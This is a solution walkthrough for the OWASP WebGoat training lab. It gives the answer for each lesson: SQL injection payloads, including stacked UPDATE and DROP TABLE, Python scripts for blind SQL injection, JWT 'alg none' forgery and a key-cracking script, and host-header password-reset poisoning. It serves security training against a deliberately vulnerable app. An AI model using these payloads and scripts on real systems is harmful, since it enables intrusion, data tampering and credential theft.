*Written by Pierre-Arnaud Laporte*

*Read this in other languages: [Français]((Almost)-Fully-Documented-Solution-(fr)).*


- [**Introduction:**](#introduction)
  * [WebGoat](#webgoat)
  * [WebWolf](#webwolf)
- [**General:**](#general)
  * [HTTP Basics](#http-basics)
  * [HTTP Proxies](#http-proxies)
  * [CIA triad](#cia-triad)
  * [Google Chrome Developer Tools](#google-chrome-developer-tools)
- [**(A1) Injection:**](#a1-injection)
  * [SQL Injection (introduction)](#sql-injection-introduction)
  * [SQL Injection (advanced)](#sql-injection-advanced)
  * [SQL Injection (mitigation)](#sql-injection-mitigation)
- [**(A2) Broken Authentification:**](#a2-broken-authentification)
  * [Secure Passwords](#secure-passwords)
  * [Password reset](#password-reset)
  * [Authentification Bypasses](#authentification-bypasses)
  * [JWT tokens](#jwt-tokens)
- [**(A3) Sensitive Data Exposure:**](#a3-sensitive-data-exposure)
  * [Insecure Login](#insecure-login)
- [**(A4) XML External Entities (XXE):**](#a4-xml-external-entities-xxe)
  * [XXE](#xxe)
- [**(A5) Broken Access Control:**](#a5-broken-access-control)
  * [Insecure Direct Object References](#insecure-direct-object-references)
  * [Missing Function Level Access Control](#missing-function-level-access-control)
- [**(A7) Cross-Site Scripting (XSS):**](#a7-cross-site-scripting-xss)
  * [Cross Site Scripting](#cross-site-scripting)
  * [Cross Site Scripting (stored)](#cross-site-scripting-stored)
  * [Cross Site Scripting (mitigation)](#cross-site-scripting-mitigation)
- [**(A8) Insecure Deserialization:**](#a8-insecure-deserialization)
  * [Insecure Deserialization](#insecure-deserialization)
- [**(A9) Vulnerable Components:**](#a9-vulnerable-components)
  * [Vulnerable Components](#vulnerable-components)
- [**(A8:2013) Request Forgery:**](#a8-2013-request-forgery)
  * [Cross-Site Request Forgeries](#cross-site-request-forgeries)
  * [Server-Side Request Forgeries](#server-side-request-forgeries)
- [**Client side:**](#client-side)
  * [Bypass front-end restrictions](#bypass-front-end-restrictions)
  * [HTML tampering](#html-tampering)
  * [Client side filtering](#client-side-filtering)
- [**Challenges:**](#challenges)
  * [Admin lost password](#admin-lost-password)
  * [Without password](#without-password)
  * [Creating a new account](#creating-a-new-account)
  * [Admin password reset](#admin-password-reset)
  * [Without account](#without-account)
  
#### **Introduction:**

##### WebGoat

1. 
Read the lesson.

##### WebWolf

3.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  There is a bug on WebWolf that prevents access to _Mailbox_. 

*   Send an email to `{user}@...`.
*   Go to http://host:port/WebWolf.
*   Log in and go read the mail received.

4.
*   Send an email to `{user}@...`
*   Go to http://host:port/WebWolf/requests.
*   Observe the `uniqueCode` parameter in the query and enter its value on **WebGoat**.

#### **General:**

##### HTTP Basics

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Type in your name and press 'go'

Enter your name and press **Go!**.  

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Turn on Show Parameters or other features  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to intercept the request with OWASP ZAP

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   Fill out the fields on **WebGoat** with `POST` or `GET` and a random number, and click on **Go!**.
*   Locate the query to `attack2` in the _Network_ tab and click on _Edit and Resend_.
*   Retrieve the `magic_num` in the body of the request, find that the request is a `POST` and click again on **Go!** with the correct parameters.

![HTTP Basics](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/http-basics.png)

##### HTTP Proxies

6.
*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   Click on **Submit** without editing the parameter.
*   Locate the query to `intercept-request` in the _Network_ tab and click on _Edit and Resend_.
*   Change the `POST` method to `GET`.
*   Change the URL from http://host:port/WebGoat/HttpProxies/intercept-request to [http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily](http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily)
*   Add in the request header `x-request-intercepted: true`.
*   Clear the body of the query.

![HTTP Proxies](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/http-proxies.png)

##### CIA triad

5.
**1. How could an intruder harm the security goal of confidentiality?**

Solution 3: By stealing a database where names and emails are stored and uploading it to a website.

**2. How could an intruder harm the security goal of integrity?**

Solution 1: By changing the names and emails of one or more users stored in a database.

**3. How could an intruder harm the security goal of availability?**

Solution 4: By launching a denial of service attack on the servers.

**4. What happens if at least one of the CIA security goals is harmed?**

Solution 2: The systems security is compromised even if only one goal is harmed.

##### Google Chrome Developer Tools

*   Open the _Development Tools_ in the browser, and go to the _Console_ tab.
*   Enter `webgoat.customjs.phoneHome()` in the console.

![Google Chrome Dev Tools 4](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/google-chrome-dev-tools-4.png)

6.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Contrary to what the hints say, the name of the request is not `dummy`, but `network`. 

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Clear all Requests from the network button, then make the request. The you should be able to figure out, which request holds the data.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The name of the request is "dummy"

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On **WebGoat** click on **Go!**.
*   Locate the query to `network` in the _Network_ tab and click on _Parameters_.

![Google Chrome Dev Tools 6](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/google-chrome-dev-tools-6.png)

#### **(A1) Injection:**

##### SQL Injection (introduction)

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You want the data from the column with the name department. You know the database name (employees) and you know the first- and lastname of the employee (first\_name, last\_name).  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) SELECT column FROM tablename WHERE condition;  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use ' instead of " when comparing two strings.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Pay attention to case sensitivity when comparing two strings.

**SQL query**: `SELECT department FROM employees WHERE first_name='Bob'`

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try the UPDATE statement  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) UPDATE table name SET column name=value WHERE condition;

**SQL query**: `UPDATE employees SET department='Sales' WHERE first_name='Tobi'`

4.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) ALTER TABLE alters the structure of an existing database  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Do not forget the data type of the new column (e.g. varchar(size) or int(size))  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) ALTER TABLE table name ADD column name data type(size);

**SQL query**: `ALTER TABLE employees ADD phone varchar(20)`

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the example. There is everything you will need.

**SQL query**: `GRANT ALTER TABLE TO UnauthorizedUser`

9.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember that for an successful Sql-Injection the query needs to always evaluate to true.

**SELECT \* FROM users\_data FIRST\_NAME = 'John' and Last\_NAME = '** `'` + `or` + `'1'='1`

10.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to check which of the input fields is susceptible to an injection attack.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Insert: 0 or 1 = 1 into the first input field. The output should tell you if this field is injectable.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The first input field is not susceptible to sql injection.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You do not need to insert any quotations into your injection-string.

*   **Login\_count**: `0`
*   **User\_Id**: `0 OR 1=1`

11.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The application is taking your input and inserting the values into the variables 'name' and 'auth\_tan' of the pre-formed SQL command.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Compound SQL statements can be made by expanding the WHERE clause of the statement with keywords like AND and OR.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try appending a SQL statement that always resolves to true.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure all quotes (" ' ") are opened and closed properly so the resulting SQL query is syntactically correct.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try extending the WHERE clause of the statement by adding something like: ' OR '1' = '1.

*   **Employee Name**: `A`
*   **Authentication TAN**: `' OR '1' = '1`

12.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to find a way, to chain another query to the end of the existing one.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use the ; metacharacter to do so.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make use of DML to change your salary.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure that the resulting query is syntactically correct.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) How about something like '; UPDATE employees....

*   **Employee Name**: `A`
*   **Authentication TAN**: `'; UPDATE employees SET salary=99999 WHERE first_name='John`

13.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use the techniques that you have learned before.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The application takes your input and filters for entries that are LIKE it.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try query chaining to reach the goal.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The DDL allows you to delete (DROP) database tables.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The underlying SQL query looks like that: "SELECT \* FROM access\_log WHERE action LIKE '%" + action + "%'".  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember that you can use the -- metacharacter to comment out the rest of the line.

**Action contains**: `%'; DROP TABLE access_log;--`

##### SQL Injection (advanced)

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember that when using an UNION each SELECT statement within UNION must have the same number of columns.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The data type of a column in the first SELECT statement must have a similar data type to that in the second SELECT statement.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Your new SQL query must end with a comment. eg: --  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If a column needs a String you could substitute something like 'a String' for it. For integers you could substitute a 1.

*   Name: `'; SELECT * FROM user_system_data;--` or `' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--`
*   Password: `passW0rD`

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the different response you receive from the server  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The vulnerability is on the register form  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The vulnerable field is the username field of the register form.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use tooling to automate this attack  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The table name is randomized at each start of WebGoat, try to figure out the name first.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Change the password through an UPDATE Statement.

As specified in the hints, it is possible to change the password using an `UPDATE`. It is also possible to find the original password as we will see in the proposed solution.

*   The **Login** form does not appear to provide any useful outputs from a variety of inputs, but the **Register** form allows us to check whether a username already exists.
*   If we try to register with the following username: `tom' AND '1'='1` we find that the username is taken.
*   We can use this as an oracle and check what Tom's password is one at a time.
*   Fortunately, the table we are seeking is named `password` (_guessing_), so we can attempt to register with the following username: `tom' AND substring(password,1,1)='t`
*   The response states the username already exists, we know that **t** is the first character of Tom's password.
*   By fuzzing for the remaining characters, we can determine that Tom's password is **thisisasecretfortomonly**.

This challenge can be a good exercise to practice scripting. Below, a small example of Python code to find the answer:

```python
import json  
import requests  
  
def sql_injection_advance_5():  
     alphabet_index = 0  
     alphabet = 'abcdefghijklmnopqrstuvwxyz'  
     password_index = 0  
     password = ''  
  
     headers = {  
        'Cookie': COOKIE,  
     }  
  
     while True:  
         payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])  
  
         data = {  
             'username_reg': payload,  
             'email_reg': 'a@a',  
             'password_reg': 'a',  
             'confirm_password_reg': 'a'  
         }  
  
         r = requests.put('http://HOST:PORT/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)  
  
         try:  
             response = json.loads(r.text)  
         except:  
             print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
             return  
  
         if "already exists please try to register with a different username" not in response['feedback']:  
             alphabet_index += 1  
             if alphabet_index > len(alphabet) - 1:  
                 return  
         else:  
             password += alphabet[alphabet_index]  
             print(password)  
             alphabet_index = 0  
             password_index += 1  
  
sql_injection_advance_5()
```  

![SQLi Advanced 5](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/sqli-advanced-5.png)

6.

**1. What is the difference between a prepared statement and a statement?**

Solution 4: A statement has got values instead of a prepared statement

**2. Which one of the following characters is a placeholder for variables?**

Solution 3: ?

**3. How can prepared statements be faster than statements?**

Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.

**4. How can a prepared statement prevent SQL-Injection?**

Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.

**5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?**

Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.

##### SQL Injection (mitigation)

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) First establish a connection, after that you can create a statement.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) SqlStringInjectionHint-mitigation-10a-10a2

The fields must contain the following words to validate the lesson: `getConnection`, `PreparedStatement`, `prepareStatement`, `?`, `?`, `setString`, `setString`.  

![SQLi Mitigation 5](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/sqli-mitigation-5.png)

6.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) A database connection has to be surrounded by a try-catch block to handle the very common case of an error while establishing the connection.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember to use the right kind of statement, so your code is no longer vulnerable for SQL injections.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The wildcard symbol '?' in a prepared statement can be filled with the right kind of method. There exists one for every data type.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure to execute your statement.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) View the previous lesson to check back on how you can build set up a connection.

Complete the window with:

```java
try {  
     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
     ps.setString(1, "Admin");  
     ps.executeUpdate();  
} catch (Exception e) {  
     System.out.println("Oops. Something went wrong!");  
}
```

![SQLi Mitigation 6](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/sqli-mitigation-6.png)

10.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)   Buggy lesson with the last version, a call to http://localhost:8080/WebGoat/SqlInjection/servers send back an error. 

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try sorting and look at the request  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Intercept the request and try to specify a different order by  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use for example "(case when (true) then hostname else id end)" in the order by and see what happens

*   Click on column sort performs a request to http://localhost:8080/WebGoat/SqlInjection/servers?column=ip. This can be exploited by intercepting the request with Browser Tools and providing prepared string as column value.
*   To get the idea about **webgoat-prd** IP address we first have to find out the table name and ip column name. The obvious guess is **servers** and **ip**:  
    `column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)`
*   If that is the correct table and column name, the table will get sorted by **ids**.
*   So after intercepting and changing the request we get the table sorted by **ids**, the guess was correct.
*   Just to check our logic, lets send request with:  
    `column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)`
*   It get's an error page, we have everything to script the attack now.
  
```python
import json  
import requests  
  
def sql_injection_mitigation_10():  
	 index = 0  
  
	 headers = {  
		 'Cookie': 'JSESSIONID=id'  
	 }  
  
	 while True:  
		 payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)  
  
		 r = requests.get('http://host:port/WebGoat/SqlInjection/servers?column=' + payload, headers=headers)  
  
		 try:  
			 response = json.loads(r.text)  
		 except:  
			 print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
			 return  
  
		 if response[0]['id'] == '1':  
			 print('webgoat-prd IP: {}.130.219.202'.format(index))  
			 return  
		 else:  
			 index += 1  
			 if index > 255:  
				 print("No IP found")  
				 return  
  
sql_injection_mitigation_10()
```

#### **(A2) Broken Authentification:**

##### Secure Passwords

4. The verification algorithm to check the password strength can be found here https://github.com/dropbox/zxcvbn.

##### Password reset

2.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  There is a bug on WebWolf that prevents access to _Mailbox_. 

*   Click on **Forgot your password?**.
*   Enter the email address `{user}@...`.
*   Open the mail on **WebWolf** to retrieve the new password.

4.
Valid credentials are: **admin** and **green**, **jerry** and **orange**, **tom** and **purple**, **larry** and **yellow**.

5. 
Read the advices.

6.
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to send a password reset link to your own account at {user}@webgoat.org, you can read this e-mail in WebWolf.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the link, can you think how the server creates this link?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Tom clicks all the links he receives in his mailbox, you can use the landing page in WebWolf to get the reset link...  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The link points to localhost:8080/PasswordReset/.... can you change the host to localhost:9090?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Intercept the request and change the host header.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) For intercepting the request you have to use a proxy. Check the HTTP-Proxies Lesson in the general category if you're unfamiliar with using proxies. Important: There seem to be problems when modifying the request header with ZAP. We recommend to use Burp instead.

*   Send an email to `tom@webgoat-cloud.org` and intercept the request.
*   Change the `Host: host:webgoat_port` header to `Host: host:webwolf_port` and return a request.
*   On **WebWolf**, go to **Incoming requests**, retrieve the variable `path` and go to the URL http://host:webgoat\_port/WebGoat/path .
*   Change the password and validate the challenge with the latter.
 
![Password Reset 6](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/password-reset-6.png)  
![Password Reset 6](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/password-reset-6-webwolf.png)

##### Authentification Bypasses

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The attack on this is similar to the story referenced, but not exactly the same.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You do want to tamper the security question parameters, but not delete them  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The logic to verify the account does expect 2 security questions to be answered, but there is a flaw in the implementation  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Have you tried renaming the secQuestion0 and secQuestion1 parameters?

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   Click on **Submit** without parameters.
*   Locate the query to `verify-account` in the _Network_ tab and click on _Edit and Resend_.
*   Modify the parameters `secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid` to `secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid`.

![Authentification Bypass](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/authentification-bypass-2.png)

##### JWT tokens

4.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation. 

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Select a different user and look at the token you receive back, use the delete button to reset the votes count  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Decode the token and look at the contents  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Change the contents of the token and replace the cookie before sending the request for getting the votes  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Change the admin field to true in the token  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Submit the token by changing the algorithm to None and remove the signature

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   Log in as Tom on WebGoat and click on **Reset Votes**.
*   Locate the query to `reset` in the _Network_ tab and click on _Headers_.
*   Notice the header: 
```
Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZm
Fsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQ
uTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA
```
*   In base64, this is decoded as: `{"alg":"HS512"}.{"Iat":1564402244,"admin":"false","user":"Tom"}.signature`.
*   Edit it to `{"alg": null}.{"Iat":1564402244,"admin":"true","user":"Tom"}.`.
*   Re-encode it to base64 (`eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.`).
*   Click on _Modify and Resend_, modify the cookie with the newly generated value and send again the request.

![JWT 4](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-4.png)

![JWT 5](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-5-2.png)

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Save the token and try to verify the token locally  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Download a word list dictionary (https://github.com/first20hours/google-10000-english)  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Write a small program or use HashCat for brute forcing the token according the word list

It is possible to validate this challenge with tools like **johntheripper** and https://jwt.io/, but in order to get a better understanding of the whole process, here a Python script.  

*   Isolate the signature, and reformat it correctly.
*   Use each word of the dictionary as a key, calculate the HMAC of the initial message, convert it to base64, and compare it with the signature.
*   If there is a match, the dictionnary word is the key used (value found : **victory**).
*   Then calculate the new signature with the modified message
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJ
pYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ
0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0LmN
vbSIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.dImA6LEwQc1-ZqVP
WWGE01u1jO2a-yfx8lZetbDqiTc
```

```python
import base64  
import hashlib  
import hmac  
  
def jwt_tokens_5():  
     token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM'.split('.')  
  
     payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"tom@webgoat.com","username":"WebGoat","Email":"tom@webgoat.com","Role":["Manager","Project Administrator"]}'.encode()  
  
     unsigned_token = (token[0] + '.' + token[1]).encode()  
  
     # signature is base64 URL encoded and padding has been removed, so we must add it  
     signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()  
  
     with open('google-10000-english-master/google-10000-english.txt', 'r') as fd:  
         lines = [line.rstrip('\n').encode() for line in fd]  
  
     def hmac_base64(key, message):  
         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))  
  
     for line in lines:  
         test = hmac_base64(line, unsigned_token)  
  
         if test == signature:  
             print('Key: {}'.format(line.decode()))  
             new_token = (token[0] + '.' + base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()  
             new_signature = hmac_base64(line, new_token)  
             new_token += ('.' + new_signature.decode().rstrip('=')).encode()  
             print('New token: {}'.format(new_token.decode()))  
             return  
  
jwt_tokens_5()
```

![JWT 5](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-5.png)

7.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  This challenge doesn't provide enough information to be completed. By looking into the source code, we can find the following has to be done: Make a `POST` request to http://host:port/WebGoat/JWT/refresh/login with header `Content-Type: application/json` and content `{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}` to obtain a `<jerry_refresh_token>`.   
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the access log you will find a token there  
